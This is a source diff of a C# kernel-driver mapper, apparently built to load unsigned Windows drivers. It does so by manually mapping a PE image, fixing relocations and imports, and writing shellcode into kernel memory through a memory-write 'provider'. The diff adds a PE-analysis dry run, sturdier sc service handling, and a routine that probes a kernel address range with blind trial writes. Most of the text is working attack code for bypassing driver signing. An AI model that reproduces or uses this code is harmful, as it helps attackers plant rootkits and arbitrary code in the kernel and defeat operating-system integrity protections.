@@ -46,9 +46,6 @@ namespace KernelMode.Driver
 			public byte[] FullPathName;
 		}
 
-		[DllImport("ntdll.dll")]
-		public static extern int NtQuerySystemInformation(int infoClass, IntPtr buffer, int length, out int returnLength);
-
 		public static void LoadUnsignedDriver()
 		{
 			IProvider provider = KernelMemory.GetProvider();
@@ -162,20 +159,273 @@ namespace KernelMode.Driver
 			Console.WriteLine("[+] Cleanup complete.");
 		}
 
-		private static bool InstallDriver(string serviceName, string driverPath)
+		public static void TestPEParsingDryRun()
 		{
-			if (!File.Exists(driverPath)) return false;
-			Process.Start("sc", $"create {serviceName} type= kernel binPath= \"{Path.GetFullPath(driverPath)}\" start= demand").WaitForExit();
-			Process.Start("sc", $"start {serviceName}").WaitForExit();
-			// STUB: FIXME!! A more robust check would be needed here in a real application
-			return true;
+			Console.Write("Enter path to driver to analyze (without loading): ");
+			string driverPath = Console.ReadLine();
+			if (!File.Exists(driverPath))
+			{
+				Console.WriteLine("[-] Driver file not found.");
+				return;
+			}
+			
+			byte[] driverImage = File.ReadAllBytes(driverPath);
+			Console.WriteLine($"[*] Loaded driver file: {driverPath} ({driverImage.Length} bytes)");
+			
+			const ushort IMAGE_DOS_SIGNATURE = 0x5A4D;
+			const uint IMAGE_NT_SIGNATURE = 0x00004550;
+			
+			// Verify DOS header
+			ushort dosSig = BitConverter.ToUInt16(driverImage, 0);
+			if (dosSig != IMAGE_DOS_SIGNATURE)
+			{
+				Console.WriteLine("[-] Invalid DOS signature.");
+				return;
+			}
+			Console.WriteLine("[+] Valid DOS signature (MZ)");
+			
+			// Verify PE header
+			int peHeaderOffset = BitConverter.ToInt32(driverImage, 0x3C);
+			Console.WriteLine($"[*] PE header offset: 0x{peHeaderOffset:X}");
+			
+			uint ntSig = BitConverter.ToUInt32(driverImage, peHeaderOffset);
+			if (ntSig != IMAGE_NT_SIGNATURE)
+			{
+				Console.WriteLine("[-] Invalid NT signature.");
+				return;
+			}
+			Console.WriteLine("[+] Valid NT signature (PE)");
+			
+			// Display header info
+			short machine = BitConverter.ToInt16(driverImage, peHeaderOffset + 4);
+			Console.WriteLine($"[*] Machine: 0x{machine:X4} ({(machine == 0x8664 ? "x64" : "x86")})");
+			
+			short numberOfSections = BitConverter.ToInt16(driverImage, peHeaderOffset + 6);
+			Console.WriteLine($"[*] Number of sections: {numberOfSections}");
+			
+			int timeStamp = BitConverter.ToInt32(driverImage, peHeaderOffset + 8);
+			DateTime compiledTime = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc).AddSeconds(timeStamp);
+			Console.WriteLine($"[*] Timestamp: {compiledTime} UTC");
+			
+			int optionalHeaderOffset = peHeaderOffset + 24;
+			int sizeOfOptionalHeader = BitConverter.ToInt16(driverImage, peHeaderOffset + 20);
+			Console.WriteLine($"[*] Optional header size: 0x{sizeOfOptionalHeader:X}");
+			
+			short characteristics = BitConverter.ToInt16(driverImage, peHeaderOffset + 22);
+			bool isDll = (characteristics & 0x2000) != 0;
+			Console.WriteLine($"[*] File characteristics: 0x{characteristics:X4} ({(isDll ? "DLL" : "EXE")})");
+			
+			short optionalMagic = BitConverter.ToInt16(driverImage, optionalHeaderOffset);
+			Console.WriteLine($"[*] Optional header magic: 0x{optionalMagic:X4} ({(optionalMagic == 0x20b ? "PE32+" : "PE32")})");
+			
+			ulong imageBase = BitConverter.ToUInt64(driverImage, optionalHeaderOffset + 24);
+			Console.WriteLine($"[*] Preferred image base: 0x{imageBase:X}");
+			
+			int sizeOfImage = BitConverter.ToInt32(driverImage, optionalHeaderOffset + 56);
+			Console.WriteLine($"[*] Size of image: 0x{sizeOfImage:X} bytes");
+			
+			int entryPointRva = BitConverter.ToInt32(driverImage, optionalHeaderOffset + 16);
+			Console.WriteLine($"[*] Entry point RVA: 0x{entryPointRva:X}");
+			
+			// List sections
+			int sectionTableOffset = optionalHeaderOffset + sizeOfOptionalHeader;
+			Console.WriteLine("\n[*] Section Table:");
+			Console.WriteLine("     Name    VirtAddr  VirtSize  RawAddr   RawSize   Chars");
+			Console.WriteLine("     ------  --------  --------  --------  --------  --------");
+			
+			for (int i = 0; i < numberOfSections; i++)
+			{
+				int entry = sectionTableOffset + (i * 40);
+				byte[] nameBytes = new byte[8];
+				Buffer.BlockCopy(driverImage, entry, nameBytes, 0, 8);
+				string name = Encoding.ASCII.GetString(nameBytes).TrimEnd('\0');
+				
+				int virtAddr = BitConverter.ToInt32(driverImage, entry + 12);
+				int virtSize = BitConverter.ToInt32(driverImage, entry + 8);
+				int rawAddr = BitConverter.ToInt32(driverImage, entry + 20);
+				int rawSize = BitConverter.ToInt32(driverImage, entry + 16);
+				int chars = BitConverter.ToInt32(driverImage, entry + 36);
+				
+				Console.WriteLine($"     {name,-8}  {virtAddr:X8}  {virtSize:X8}  {rawAddr:X8}  {rawSize:X8}  {chars:X8}");
+			}
+			
+			// Print imports
+			const int IMAGE_DIRECTORY_ENTRY_IMPORT = 1;
+			int dirBase = optionalHeaderOffset + 112 + (IMAGE_DIRECTORY_ENTRY_IMPORT * 8);
+			int importRva = BitConverter.ToInt32(driverImage, dirBase);
+			if (importRva != 0)
+			{
+				Console.WriteLine("\n[*] Import Directory:");
+				int importOff = RvaToOffset(driverImage, importRva);
+				
+				int descIndex = 0;
+				while (true)
+				{
+					int originalFirstThunk = BitConverter.ToInt32(driverImage, importOff);
+					int nameRva = BitConverter.ToInt32(driverImage, importOff + 12);
+					int firstThunk = BitConverter.ToInt32(driverImage, importOff + 16);
+					
+					if (originalFirstThunk == 0 && nameRva == 0 && firstThunk == 0)
+						break;
+					
+					int nameOff = RvaToOffset(driverImage, nameRva);
+					string dllName = ReadNullTerminatedString(driverImage, nameOff);
+					Console.WriteLine($"     #{descIndex}: {dllName}");
+					
+					// Parse imports from this DLL
+					int thunkRva = firstThunk;
+					int thunkOff = RvaToOffset(driverImage, originalFirstThunk != 0 ? originalFirstThunk : firstThunk);
+					int funcIndex = 0;
+					
+					while (true)
+					{
+						ulong thunkData = optionalMagic == 0x20b 
+							? BitConverter.ToUInt64(driverImage, thunkOff) 
+							: BitConverter.ToUInt32(driverImage, thunkOff);
+						
+						if (thunkData == 0) break;
+						
+						if ((thunkData & (optionalMagic == 0x20b ? 0x8000000000000000UL : 0x80000000)) != 0)
+						{
+							ushort ordinal = (ushort)(thunkData & 0xFFFF);
+							Console.WriteLine($"         #{funcIndex}: Ordinal {ordinal}");
+						}
+						else
+						{
+							int importByNameRva = (int)(thunkData & 0xFFFFFFFF);
+							int hintNameOff = RvaToOffset(driverImage, importByNameRva + 2);
+							string funcName = ReadNullTerminatedString(driverImage, hintNameOff);
+							Console.WriteLine($"         #{funcIndex}: {funcName}");
+						}
+						
+						thunkOff += (optionalMagic == 0x20b ? 8 : 4);
+						funcIndex++;
+					}
+					
+					importOff += 20;
+					descIndex++;
+				}
+			}
+			
+			Console.WriteLine("\n[+] Driver analysis complete.");
 		}
 
-		private static void UnloadDriver(string serviceName)
+		private static bool InstallDriver(string serviceName, string driverPath)
 		{
-			Console.WriteLine($"[*] Unloading driver service: {serviceName}");
-			Process.Start("sc", $"stop {serviceName}").WaitForExit();
-			Process.Start("sc", $"delete {serviceName}").WaitForExit();
+			if (!File.Exists(driverPath))
+			{
+				Console.WriteLine($"[-] Driver file not found: {driverPath}");
+				return false;
+			}
+			
+			// Stop and delete service if it already exists
+			UnloadDriver(serviceName, false);  // Silent mode for cleanup
+			
+			string fullPath = Path.GetFullPath(driverPath);
+			Console.WriteLine($"[*] Creating service {serviceName} with driver: {fullPath}");
+			
+			try
+			{
+				using (var process = Process.Start(new ProcessStartInfo
+				{
+					FileName = "sc",
+					Arguments = $"create {serviceName} type= kernel binPath= \"{fullPath}\" start= demand",
+					UseShellExecute = false,
+					RedirectStandardOutput = true,
+					RedirectStandardError = true,
+					CreateNoWindow = true
+				}))
+				{
+					process.WaitForExit(5000); // 5 second timeout
+					if (process.ExitCode != 0)
+					{
+						Console.WriteLine($"[-] Failed to create service. Exit code: {process.ExitCode}");
+						string output = process.StandardOutput.ReadToEnd();
+						if (!string.IsNullOrEmpty(output))
+							Console.WriteLine(output);
+						return false;
+					}
+				}
+				
+				Console.WriteLine("[*] Starting service...");
+				using (var process = Process.Start(new ProcessStartInfo
+				{
+					FileName = "sc",
+					Arguments = $"start {serviceName}",
+					UseShellExecute = false,
+					RedirectStandardOutput = true,
+					RedirectStandardError = true,
+					CreateNoWindow = true
+				}))
+				{
+					process.WaitForExit(5000); // 5 second timeout					
+					
+					// Exit code 0 means success, 1077 usually means "service already started"
+					if (process.ExitCode != 0 && process.ExitCode != 1077)
+					{
+						Console.WriteLine($"[-] Failed to start service. Exit code: {process.ExitCode}");
+						string output = process.StandardOutput.ReadToEnd();
+						if (!string.IsNullOrEmpty(output))
+							Console.WriteLine(output);
+						
+						// Cleanup on failure
+						Process.Start("sc", $"delete {serviceName}").WaitForExit();
+						return false;
+					}
+				}
+				
+				return true;
+			}
+			catch (Exception ex)
+			{
+				Console.WriteLine($"[-] Error installing driver: {ex.Message}");
+				return false;
+			}
+		}
+
+		private static void UnloadDriver(string serviceName, bool verbose = true)
+		{
+			if (verbose)
+				Console.WriteLine($"[*] Unloading driver service: {serviceName}");
+			
+			try
+			{
+				// Stop the service
+				using (var process = Process.Start(new ProcessStartInfo
+				{
+					FileName = "sc",
+					Arguments = $"stop {serviceName}",
+					UseShellExecute = false,
+					RedirectStandardOutput = true,
+					CreateNoWindow = true
+				}))
+				{
+					process.WaitForExit(10000); // 10 second timeout
+					// We don't check exit code here because the service might not be running
+				}
+				
+				// Delete the service
+				using (var process = Process.Start(new ProcessStartInfo
+				{
+					FileName = "sc",
+					Arguments = $"delete {serviceName}",
+					UseShellExecute = false,
+					RedirectStandardOutput = true,
+					CreateNoWindow = true
+				}))
+				{
+					process.WaitForExit(5000);
+					if (process.ExitCode != 0 && verbose)
+					{
+						Console.WriteLine($"[-] Warning: Failed to delete service {serviceName}. Exit code: {process.ExitCode}");
+					}
+				}
+			}
+			catch (Exception ex)
+			{
+				if (verbose)
+					Console.WriteLine($"[-] Error unloading driver: {ex.Message}");
+			}
 		}
 
 		private static MappedImageInfo MapPEImage(IProvider provider, byte[] image)
@@ -262,104 +512,98 @@ namespace KernelMode.Driver
 		{
 			const int IMAGE_DIRECTORY_ENTRY_BASERELOC = 5;
 			int peHeaderOffset = BitConverter.ToInt32(originalImage, 0x3C);
-			int relocRva = BitConverter.ToInt32(originalImage, peHeaderOffset + 24 + 112 + (IMAGE_DIRECTORY_ENTRY_BASERELOC * 8));
-			int relocSize = BitConverter.ToInt32(originalImage, peHeaderOffset + 24 + 112 + (IMAGE_DIRECTORY_ENTRY_BASERELOC * 8) + 4);
 
+			// DataDirectory[5]
+			int dirBase = peHeaderOffset + 24 + 112 + (IMAGE_DIRECTORY_ENTRY_BASERELOC * 8);
+			int relocRva = BitConverter.ToInt32(originalImage, dirBase + 0);
+			int relocSize = BitConverter.ToInt32(originalImage, dirBase + 4);
 			if (relocRva == 0 || relocSize == 0) return;
 
-			int offset = RvaToOffset(originalImage, relocRva);
+			// Relocation data is in file; iterate via file mapping (RvaToOffset correct for reading the blocks)
+			int fileOffset = RvaToOffset(originalImage, relocRva);
 			ulong delta = newBase - originalBase;
+			int end = fileOffset + relocSize;
 
-			while (offset < originalImage.Length && relocSize > 0)
+			while (fileOffset < end)
 			{
-				int pageRva = BitConverter.ToInt32(originalImage, offset);
-				int blockSize = BitConverter.ToInt32(originalImage, offset + 4);
+				int pageRva = BitConverter.ToInt32(originalImage, fileOffset + 0);
+				int blockSize = BitConverter.ToInt32(originalImage, fileOffset + 4);
 				int entryCount = (blockSize - 8) / 2;
 
 				for (int i = 0; i < entryCount; i++)
 				{
-					ushort entry = BitConverter.ToUInt16(originalImage, offset + 8 + i * 2);
-					int type = (entry >> 12);
+					ushort entry = BitConverter.ToUInt16(originalImage, fileOffset + 8 + i * 2);
+					int type = (entry >> 12) & 0xF;
 					int rvaOffset = entry & 0xFFF;
+					if (type == 0 /* IMAGE_REL_BASED_ABSOLUTE */) continue;
+					if (type != 10 /* IMAGE_REL_BASED_DIR64 */) continue;
 
-					if (type == 0) continue; // skip ABSOLUTE
-
-					int relocOffset = RvaToOffset(originalImage, pageRva + rvaOffset);
-					ulong origValue = BitConverter.ToUInt64(mappedImage, relocOffset);
+					int targetRva = pageRva + rvaOffset;
+					// mappedImage is RVA-indexed, so write directly at RVA
+					ulong origValue = BitConverter.ToUInt64(mappedImage, targetRva);
 					ulong newValue = origValue + delta;
-					Buffer.BlockCopy(BitConverter.GetBytes(newValue), 0, mappedImage, relocOffset, 8);
+					Buffer.BlockCopy(BitConverter.GetBytes(newValue), 0, mappedImage, targetRva, 8);
 				}
 
-				offset += blockSize;
-				relocSize -= blockSize;
+				fileOffset += blockSize;
 			}
-		}
-
-		private static int RvaToOffset(byte[] image, int rva)
-		{
-			int peHeaderOffset = BitConverter.ToInt32(image, 0x3C);
-			short numberOfSections = BitConverter.ToInt16(image, peHeaderOffset + 6);
-			int sizeOfOptionalHeader = BitConverter.ToInt16(image, peHeaderOffset + 20);
-			int sectionTableOffset = peHeaderOffset + 24 + sizeOfOptionalHeader;
-
-			for (int i = 0; i < numberOfSections; i++)
-			{
-				int entry = sectionTableOffset + (i * 40);
-				int virtAddr = BitConverter.ToInt32(image, entry + 12);
-				int rawPtr = BitConverter.ToInt32(image, entry + 20);
-				int rawSize = BitConverter.ToInt32(image, entry + 16);
-
-				if (rva >= virtAddr && rva < virtAddr + rawSize)
-					return rawPtr + (rva - virtAddr);
-			}
-
-			return rva;
 		}
 
 		private static void ApplyImportTable(byte[] originalImage, byte[] mappedImage)
 		{
 			const int IMAGE_DIRECTORY_ENTRY_IMPORT = 1;
 			int peHeaderOffset = BitConverter.ToInt32(originalImage, 0x3C);
-			int importRva = BitConverter.ToInt32(originalImage, peHeaderOffset + 24 + 112 + (IMAGE_DIRECTORY_ENTRY_IMPORT * 8));
+			int dirBase = peHeaderOffset + 24 + 112 + (IMAGE_DIRECTORY_ENTRY_IMPORT * 8);
+			int importRva = BitConverter.ToInt32(originalImage, dirBase + 0);
 			if (importRva == 0) return;
 
-			int offset = RvaToOffset(originalImage, importRva);
+			// Walk IMAGE_IMPORT_DESCRIPTORs using file offsets for reading metadata
+			int descOff = RvaToOffset(originalImage, importRva);
 			while (true)
 			{
-				int originalFirstThunk = BitConverter.ToInt32(originalImage, offset);
-				int nameRva = BitConverter.ToInt32(originalImage, offset + 12);
-				int firstThunk = BitConverter.ToInt32(originalImage, offset + 16);
-				if (originalFirstThunk == 0 && nameRva == 0 && firstThunk == 0)
+				int originalFirstThunk = BitConverter.ToInt32(originalImage, descOff + 0);
+				int timeDateStamp      = BitConverter.ToInt32(originalImage, descOff + 4);
+				int forwarderChain     = BitConverter.ToInt32(originalImage, descOff + 8);
+				int nameRva            = BitConverter.ToInt32(originalImage, descOff + 12);
+				int firstThunkRva      = BitConverter.ToInt32(originalImage, descOff + 16);
+				if (originalFirstThunk == 0 && nameRva == 0 && firstThunkRva == 0)
 					break;
 
-				int nameOffset = RvaToOffset(originalImage, nameRva);
-				string dllName = ReadNullTerminatedString(originalImage, nameOffset);
+				// Read DLL name (from file image)
+				int nameOff = RvaToOffset(originalImage, nameRva);
+				string dllName = ReadNullTerminatedString(originalImage, nameOff);
 				Console.WriteLine("[*] Import DLL: " + dllName);
 
-				int thunkOffset = RvaToOffset(originalImage, firstThunk);
+				// Walk INT/IAT via RVAs; Read names from file image; Write addresses to mapped image (RVA space)
+				int thunkRva = firstThunkRva;
 				while (true)
 				{
-					ulong thunkData = BitConverter.ToUInt64(originalImage, thunkOffset);
+					ulong thunkData = BitConverter.ToUInt64(mappedImage, thunkRva); // read from mapped (RVA-based)
 					if (thunkData == 0) break;
 
-					if ((thunkData & 0x8000000000000000) == 0) // Not an ordinal
+					// Ordinal?
+					if ((thunkData & 0x8000000000000000UL) != 0)
+					{
+						ushort ordinal = (ushort)(thunkData & 0xFFFF);
+						// TODO: resolve by ordinal if needed
+					}
+					else
 					{
 						int importByNameRva = (int)(thunkData & 0xFFFFFFFF);
-						int hintNameOffset = RvaToOffset(originalImage, importByNameRva + 2);
-						string funcName = ReadNullTerminatedString(originalImage, hintNameOffset);
+						int hintNameOff = RvaToOffset(originalImage, importByNameRva + 2); // skip hint
+						string funcName = ReadNullTerminatedString(originalImage, hintNameOff);
 						Console.WriteLine($"    - {funcName}");
 
 						ulong resolved = ResolveKernelExport(funcName);
 						if (resolved == 0)
-						{
 							Console.WriteLine($"[-] Failed to resolve import: {funcName}");
-						}
-						Buffer.BlockCopy(BitConverter.GetBytes(resolved), 0, mappedImage, thunkOffset, 8);
+
+						Buffer.BlockCopy(BitConverter.GetBytes(resolved), 0, mappedImage, thunkRva, 8);
 					}
-					thunkOffset += 8;
+					thunkRva += 8;
 				}
 
-				offset += 20;
+				descOff += 20; // sizeof(IMAGE_IMPORT_DESCRIPTOR)
 			}
 		}
 
@@ -422,70 +666,80 @@ namespace KernelMode.Driver
 			}
 		}
 
-		private static ulong GetNtoskrnlBase()
+		public static bool TryQuerySystemModules(out IntPtr buffer, out int moduleCount, out int entrySize)
 		{
+			buffer = IntPtr.Zero;
+			moduleCount = 0;
+			entrySize = Marshal.SizeOf(typeof(SYSTEM_MODULE_INFORMATION));
+
 			const int SystemModuleInformation = 11;
 			int length = 0;
-			NtQuerySystemInformation(SystemModuleInformation, IntPtr.Zero, 0, out length);
-			if (length == 0) return 0;
+			NativeMethods.NtQuerySystemInformation(SystemModuleInformation, IntPtr.Zero, 0, out length);
+			if (length == 0) return false;
 
-			IntPtr buffer = Marshal.AllocHGlobal(length);
-			if (NtQuerySystemInformation(SystemModuleInformation, buffer, length, out _) != 0)
+			buffer = Marshal.AllocHGlobal(length);
+			if (NativeMethods.NtQuerySystemInformation(SystemModuleInformation, buffer, length, out _) != 0)
 			{
 				Marshal.FreeHGlobal(buffer);
+				buffer = IntPtr.Zero;
+				return false;
+			}
+
+			// NumberOfModules (ULONG) at offset 0
+			moduleCount = Marshal.ReadInt32(buffer);
+			return true;
+		}
+
+		private static ulong GetNtoskrnlBase()
+		{
+			if (!TryQuerySystemModules(out var buffer, out var count, out var entrySize))
+				return 0;
+
+			try
+			{
+				// Entries start after 4-byte NumberOfModules
+				IntPtr current = new IntPtr(buffer.ToInt64() + 4);
+				for (int i = 0; i < count; i++)
+				{
+					var entry = Marshal.PtrToStructure<SYSTEM_MODULE_INFORMATION>(current);
+					string name = Encoding.ASCII.GetString(entry.FullPathName).TrimEnd('\0').ToLowerInvariant();
+					if (name.EndsWith("\\ntoskrnl.exe") || name.EndsWith("/ntoskrnl.exe") || name.Contains("ntoskrnl.exe"))
+					{
+						return (ulong)entry.ImageBase.ToInt64();
+					}
+					current = new IntPtr(current.ToInt64() + entrySize);
+				}
 				return 0;
 			}
-
-			long count = Marshal.ReadIntPtr(buffer).ToInt64();
-			IntPtr current = new IntPtr(buffer.ToInt64() + IntPtr.Size);
-			for (int i = 0; i < count; i++)
+			finally
 			{
-				var entry = Marshal.PtrToStructure<SYSTEM_MODULE_INFORMATION>(current);
-				string name = Encoding.ASCII.GetString(entry.FullPathName).TrimEnd('\0').ToLower();
-				if (name.EndsWith("ntoskrnl.exe"))
-				{
-					Marshal.FreeHGlobal(buffer);
-					return (ulong)entry.ImageBase.ToInt64();
-				}
-				if (entry.NextOffset == 0) break;
-				current = new IntPtr(current.ToInt64() + entry.NextOffset);
+				Marshal.FreeHGlobal(buffer);
 			}
-
-			Marshal.FreeHGlobal(buffer);
-			return 0;
 		}
 
 		private static ulong ResolveDrvMapBase()
 		{
-			const int SystemModuleInformation = 11;
-			int length = 0;
-			NtQuerySystemInformation(SystemModuleInformation, IntPtr.Zero, 0, out length);
-			if (length == 0) return 0;
+			if (!TryQuerySystemModules(out var buffer, out var count, out var entrySize))
+				return 0;
 
-			IntPtr buffer = Marshal.AllocHGlobal(length);
-			if (NtQuerySystemInformation(SystemModuleInformation, buffer, length, out _) != 0)
+			try
 			{
-				Marshal.FreeHGlobal(buffer);
+				IntPtr current = new IntPtr(buffer.ToInt64() + 4);
+				for (int i = 0; i < count; i++)
+				{
+					var entry = Marshal.PtrToStructure<SYSTEM_MODULE_INFORMATION>(current);
+					string name = Encoding.ASCII.GetString(entry.FullPathName).TrimEnd('\0').ToLowerInvariant();
+					if (name.Contains("drvmap"))
+						return (ulong)entry.ImageBase.ToInt64();
+
+					current = new IntPtr(current.ToInt64() + entrySize);
+				}
 				return 0;
 			}
-
-			long count = Marshal.ReadIntPtr(buffer).ToInt64();
-			IntPtr current = new IntPtr(buffer.ToInt64() + IntPtr.Size);
-			for (int i = 0; i < count; i++)
+			finally
 			{
-				var entry = Marshal.PtrToStructure<SYSTEM_MODULE_INFORMATION>(current);
-				string name = Encoding.ASCII.GetString(entry.FullPathName).TrimEnd('\0');
-				if (name.ToLower().Contains("drvmap"))
-				{
-					Marshal.FreeHGlobal(buffer);
-					return (ulong)entry.ImageBase.ToInt64();
-				}
-				if (entry.NextOffset == 0) break;
-				current = new IntPtr(current.ToInt64() + entry.NextOffset);
+				Marshal.FreeHGlobal(buffer);
 			}
-
-			Marshal.FreeHGlobal(buffer);
-			return 0;
 		}
 
 		static void TriggerDrvMap(IProvider provider, ulong shellcodeAddr, ulong callbackPointerAddr)
@@ -531,14 +785,105 @@ namespace KernelMode.Driver
 		{
 			// Try to find a suitable address in kernel memory to write the data
 			ulong baseAddr = 0xFFFF800000000000;
+			const int chunkSize = 8; // For providers that only support 8-byte writes
+			
 			for (ulong addr = baseAddr; addr < baseAddr + 0x10000000; addr += 0x1000)
 			{
+				// Try writing in chunks for providers that don't support large writes
+				bool success = true;
+				
+				// First attempt the full write - more efficient if supported
 				if (provider.WriteMemory(addr, data, data.Length))
 				{
 					return addr;
 				}
+				
+				// If full write fails, try writing in chunks
+				for (int offset = 0; offset < data.Length; offset += chunkSize)
+				{
+					int bytesToWrite = Math.Min(chunkSize, data.Length - offset);
+					byte[] chunk = new byte[bytesToWrite];
+					Buffer.BlockCopy(data, offset, chunk, 0, bytesToWrite);
+					
+					if (!provider.WriteMemory(addr + (ulong)offset, chunk, bytesToWrite))
+					{
+						success = false;
+						break;
+					}
+				}
+				
+				if (success)
+				{
+					// Verify the write succeeded by reading it back
+					byte[] verification = new byte[data.Length];
+					if (provider.ReadMemory(addr, verification, verification.Length))
+					{
+						for (int i = 0; i < data.Length; i++)
+						{
+							if (data[i] != verification[i])
+							{
+								success = false;
+								break;
+							}
+						}
+					}
+					else
+					{
+						success = false;
+					}
+					
+					if (success)
+					{
+						return addr;
+					}
+				}
 			}
+			
 			return 0;
 		}
-    	}
+
+		private static int RvaToOffset(byte[] image, int rva)
+		{
+			int peHeaderOffset = BitConverter.ToInt32(image, 0x3C);
+			short numberOfSections = BitConverter.ToInt16(image, peHeaderOffset + 6);
+			int sizeOfOptionalHeader = BitConverter.ToInt16(image, peHeaderOffset + 20);
+			int sectionTableOffset = peHeaderOffset + 24 + sizeOfOptionalHeader;
+
+			for (int i = 0; i < numberOfSections; i++)
+			{
+				int entry = sectionTableOffset + (i * 40);
+				int virtAddr = BitConverter.ToInt32(image, entry + 12);
+				int virtSize = BitConverter.ToInt32(image, entry + 8);
+				int rawPtr = BitConverter.ToInt32(image, entry + 20);
+				int rawSize = BitConverter.ToInt32(image, entry + 16);
+
+				if (rva >= virtAddr && rva < virtAddr + virtSize)
+					return rawPtr + (rva - virtAddr);
+			}
+
+			// If RVA isn't in any section, it's in the header (which is mapped 1:1)
+			return rva;
+		}
+
+		private static bool ValidateDriverMapping(MappedImageInfo driverInfo, byte[] image)
+		{
+			int peHeaderOffset = BitConverter.ToInt32(image, 0x3C);
+			int optionalHeaderOffset = peHeaderOffset + 24;
+			int sizeOfImage = BitConverter.ToInt32(image, optionalHeaderOffset + 56);
+			
+			// Verify entry point is reasonable (non-zero and within image)
+			if (driverInfo.EntryPoint < driverInfo.BaseAddress || 
+				driverInfo.EntryPoint >= driverInfo.BaseAddress + (ulong)sizeOfImage)
+			{
+				Console.WriteLine("[-] Warning: Driver entry point appears invalid.");
+				return false;
+			}
+			
+			// Get Windows build number for diagnostic info
+			int buildNumber = Environment.OSVersion.Version.Build;
+			Console.WriteLine($"[*] Windows Build: {buildNumber}");
+			
+			return true;
+		}
     }
+}
